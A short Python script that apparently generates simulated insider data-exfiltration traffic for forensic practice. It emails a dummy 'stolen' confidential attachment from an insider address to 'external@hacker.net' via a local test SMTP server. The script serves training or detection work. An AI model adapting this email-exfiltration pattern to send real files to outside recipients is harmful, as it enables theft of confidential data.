import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def send_forensic_payload():
    # 1. Setup the Email metadata
    sender_email = "insider@company.local"
    receiver_email = "external@hacker.net"
    subject = "PROJECT_Z_BLUEPRINTS"
    body = "Please find the attached confidential documents as discussed."

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    # 2. Create a "Stolen" File attachment
    filename = "confidential.txt"
    attachment_content = "TOP SECRET DATA: Coordinates 45.1N, 78.3W. Access Code: 9921."
    
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment_content.encode())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f"attachment; filename= {filename}")
    msg.attach(part)

    # 3. Connect and Send to your local server
    try:
        # Port 1025 matches the aiosmtpd server we just started
        server = smtplib.SMTP('127.0.0.1', 1025)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Success: Email and attachment sent to the forensic network!")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    send_forensic_payload()